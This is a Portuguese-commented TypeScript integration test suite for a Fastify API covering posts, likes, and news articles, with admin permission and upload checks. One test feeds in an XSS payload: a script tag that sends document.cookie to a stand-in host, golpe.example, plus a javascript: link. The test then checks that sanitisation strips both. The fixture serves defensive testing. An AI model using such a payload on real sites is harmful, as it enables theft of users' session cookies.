/** Integração do feed (posts + curtidas) e do jornal (notícias) com Postgres, Redis e S3 reais. */
import { randomUUID } from 'node:crypto';

import type { FastifyInstance } from 'fastify';
import sharp from 'sharp';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';

import { iniciarAmbiente, type AmbienteIntegracao } from '../../testes/ambiente-integracao.js';
import { bearer, criarUsuario, type UsuarioTeste } from '../../testes/usuarios-teste.js';

let amb: AmbienteIntegracao;
let app: FastifyInstance;
let admin: UsuarioTeste;
let maria: UsuarioTeste;
let joao: UsuarioTeste;
let jpeg: Buffer;

interface Post {
  id: string;
  legenda: string;
  imagens: { url: string }[];
  totalCurtidas: number;
  curtidoPorMim: boolean;
  publicado?: boolean;
}
interface Noticia {
  id: string;
  slug: string;
  conteudo?: string;
  imagem: string | null;
  publicado: boolean;
}

function multipart(partes: { campo: string; conteudo: Buffer | string; arquivo?: string }[]) {
  const f = `----abraco${randomUUID()}`;
  const corpo = partes.flatMap((p) => [
    Buffer.from(
      `--${f}\r\nContent-Disposition: form-data; name="${p.campo}"` +
        (p.arquivo ? `; filename="${p.arquivo}"\r\nContent-Type: image/jpeg` : '') +
        '\r\n\r\n',
    ),
    Buffer.isBuffer(p.conteudo) ? p.conteudo : Buffer.from(p.conteudo),
    Buffer.from('\r\n'),
  ]);
  return {
    payload: Buffer.concat([...corpo, Buffer.from(`--${f}--\r\n`)]),
    headers: { 'content-type': `multipart/form-data; boundary=${f}` },
  };
}

async function criarPost(
  legenda = 'Trovão ganhou baia nova!',
  imagens = [jpeg, jpeg],
  token = admin.token,
) {
  const m = multipart([
    { campo: 'legenda', conteudo: legenda },
    ...imagens.map((conteudo) => ({ campo: 'imagens', conteudo, arquivo: 'foto.jpg' })),
  ]);
  return app.inject({
    method: 'POST',
    url: '/v1/admin/posts',
    headers: { ...bearer(token), ...m.headers },
    payload: m.payload,
  });
}

const req = (
  method: 'GET' | 'POST' | 'PUT' | 'PATCH' | 'DELETE',
  url: string,
  token?: string,
  payload?: Record<string, unknown>,
) => app.inject({ method, url, headers: bearer(token), ...(payload ? { payload } : {}) });

beforeAll(async () => {
  amb = await iniciarAmbiente();
  app = amb.app;
  admin = await criarUsuario(app, amb.prisma, { role: 'ADMIN' });
  maria = await criarUsuario(app, amb.prisma);
  joao = await criarUsuario(app, amb.prisma);
  jpeg = await sharp({ create: { width: 640, height: 480, channels: 3, background: '#fb923c' } })
    .jpeg()
    .withExif({ IFD3: { GPSLatitudeRef: 'S', GPSLatitude: '23/1 33/1 0/1' } })
    .toBuffer();
});

afterAll(async () => {
  await amb.encerrar();
});

beforeEach(async () => {
  await amb.prisma.$executeRawUnsafe('TRUNCATE posts, noticias RESTART IDENTITY CASCADE');
  await amb.redis.flushall();
});

describe('feed', () => {
  it('admin cria rascunho → publica → público vê com fotos sem EXIF; curtidas por usuário', async () => {
    const r = await criarPost();
    expect(r.statusCode, r.body).toBe(201);
    const post = r.json<Post>();
    expect(post).toMatchObject({ publicado: false, totalCurtidas: 0 });

    expect((await req('GET', '/v1/posts')).json<{ itens: Post[] }>().itens).toHaveLength(0);
    expect((await req('GET', `/v1/posts/${post.id}`)).statusCode).toBe(404);

    expect(
      (await req('PUT', `/v1/admin/posts/${post.id}/publicacao`, admin.token, { publicado: true }))
        .statusCode,
    ).toBe(204);
    const publico = (await req('GET', '/v1/posts')).json<{ itens: Post[] }>().itens;
    expect(publico.map((p) => p.id)).toEqual([post.id]);
    expect(publico[0]).not.toHaveProperty('publicado');

    const img = await fetch(publico[0]?.imagens[0]?.url ?? '');
    expect(img.status).toBe(200);
    expect((await sharp(Buffer.from(await img.arrayBuffer())).metadata()).exif).toBeUndefined();

    for (const u of [maria, maria, joao]) {
      expect((await req('POST', `/v1/posts/${post.id}/curtida`, u.token)).statusCode).toBe(204);
    }
    expect((await req('GET', `/v1/posts/${post.id}`, maria.token)).json<Post>()).toMatchObject({
      totalCurtidas: 2,
      curtidoPorMim: true,
    });
    await req('DELETE', `/v1/posts/${post.id}/curtida`, maria.token);
    expect((await req('GET', `/v1/posts/${post.id}`)).json<Post>()).toMatchObject({
      totalCurtidas: 1,
      curtidoPorMim: false,
    });
  });

  it('curtir em paralelo conta uma vez; curtir sem login → 401; curtir rascunho → 404', async () => {
    const { id } = (await criarPost()).json<Post>();
    expect((await req('POST', `/v1/posts/${id}/curtida`, maria.token)).statusCode).toBe(404);
    await req('PUT', `/v1/admin/posts/${id}/publicacao`, admin.token, { publicado: true });
    await Promise.all([1, 2, 3, 4].map(() => req('POST', `/v1/posts/${id}/curtida`, maria.token)));
    expect(await amb.prisma.curtida.count()).toBe(1);
    expect((await req('POST', `/v1/posts/${id}/curtida`)).statusCode).toBe(401);
  });

  it('.exe disfarçado → 422; usuário comum não cria post (403); remover apaga as fotos', async () => {
    const exe = Buffer.concat([Buffer.from('MZ\x90\x00', 'latin1'), Buffer.alloc(200)]);
    expect((await criarPost('x', [jpeg, exe])).statusCode).toBe(422);
    expect((await criarPost('x', [jpeg], maria.token)).statusCode).toBe(403);
    expect(await amb.prisma.post.count()).toBe(0);

    const { id } = (await criarPost()).json<Post>();
    const chaves = (await amb.prisma.postImagem.findMany()).map((i) => i.url);
    expect((await req('DELETE', `/v1/admin/posts/${id}`, admin.token)).statusCode).toBe(204);
    expect(await amb.prisma.postImagem.count()).toBe(0);
    const { HeadObjectCommand } = await import('@aws-sdk/client-s3');
    for (const Key of chaves) {
      await expect(
        amb.s3.cliente.send(new HeadObjectCommand({ Bucket: amb.s3.config.bucket, Key })),
      ).rejects.toMatchObject({
        name: 'NotFound',
      });
    }
  });

  it('editar legenda (Zod estrito) e lista do admin com rascunhos', async () => {
    const { id } = (await criarPost()).json<Post>();
    const r = await req('PATCH', `/v1/admin/posts/${id}`, admin.token, {
      legenda: '  Nova legenda  ',
    });
    expect(r.json<Post>().legenda).toBe('Nova legenda');
    expect(
      (await req('PATCH', `/v1/admin/posts/${id}`, admin.token, { legenda: 'x', publicado: true }))
        .statusCode,
    ).toBe(400);
    expect(
      (await req('GET', '/v1/admin/posts', admin.token)).json<{ itens: Post[] }>().itens,
    ).toHaveLength(1);
  });
});

describe('jornal', () => {
  const nova = (extra: Record<string, unknown> = {}) =>
    req('POST', '/v1/admin/noticias', admin.token, {
      titulo: 'Cavalo Trovão é adotado!',
      resumo: 'Depois de 2 anos, Trovão ganhou um lar.',
      conteudo: '# Que alegria\n\nTrovão foi para uma **fazenda**.',
      ...extra,
    });

  it('cria (slug do título) → publica → público lê por slug, com HTML removido', async () => {
    const r = await nova({
      conteudo:
        'Leia <script>fetch("https://golpe.example?c="+document.cookie)</script>[aqui](javascript:alert(1))',
    });
    expect(r.statusCode, r.body).toBe(201);
    const n = r.json<Noticia>();
    expect(n.slug).toBe('cavalo-trovao-e-adotado');
    expect(n.conteudo).toBe('Leia [aqui](#)');

    expect((await req('GET', `/v1/noticias/${n.slug}`)).statusCode).toBe(404);
    await req('PUT', `/v1/admin/noticias/${n.id}/publicacao`, admin.token, { publicado: true });
    const publica = await req('GET', `/v1/noticias/${n.slug}`);
    expect(publica.statusCode).toBe(200);
    expect(publica.body).not.toMatch(/script|javascript|golpe/i);
    // Listagem sem o conteúdo completo.
    const lista = (await req('GET', '/v1/noticias')).json<{ itens: Noticia[] }>();
    expect(lista.itens[0]).not.toHaveProperty('conteudo');
  });

  it('título repetido ganha sufixo; editar o título mantém o endereço', async () => {
    const a = (await nova()).json<Noticia>();
    const b = (await nova()).json<Noticia>();
    expect(b.slug).toBe('cavalo-trovao-e-adotado-2');
    const editada = await req('PUT', `/v1/admin/noticias/${a.id}`, admin.token, {
      titulo: 'Título totalmente novo',
      resumo: 'r',
      conteudo: 'c',
    });
    expect(editada.json<Noticia>().slug).toBe('cavalo-trovao-e-adotado');
    const conflito = await req('PUT', `/v1/admin/noticias/${a.id}`, admin.token, {
      titulo: 't',
      resumo: 'r',
      conteudo: 'c',
      slug: b.slug,
    });
    expect(conflito.statusCode).toBe(409);
  });

  it('capa: upload sem EXIF, troca e remoção; usuário comum → 403', async () => {
    const n = (await nova()).json<Noticia>();
    const m = multipart([{ campo: 'imagem', conteudo: jpeg, arquivo: 'capa.jpg' }]);
    const r = await app.inject({
      method: 'PUT',
      url: `/v1/admin/noticias/${n.id}/imagem`,
      headers: { ...bearer(admin.token), ...m.headers },
      payload: m.payload,
    });
    expect(r.statusCode, r.body).toBe(200);
    const capa = r.json<Noticia>().imagem ?? '';
    expect((await fetch(capa)).status).toBe(200);
    expect(
      (await req('DELETE', `/v1/admin/noticias/${n.id}/imagem`, admin.token)).json<Noticia>()
        .imagem,
    ).toBeNull();

    expect(
      (
        await req('POST', '/v1/admin/noticias', maria.token, {
          titulo: 't',
          resumo: 'r',
          conteudo: 'c',
        })
      ).statusCode,
    ).toBe(403);
    expect((await req('GET', '/v1/admin/noticias', maria.token)).statusCode).toBe(403);
  });

  it('slug inválido na URL → 400; inexistente → 404', async () => {
    expect((await req('GET', '/v1/noticias/Com%20Espaco')).statusCode).toBe(400);
    expect((await req('GET', '/v1/noticias/nao-existe')).statusCode).toBe(404);
  });
});
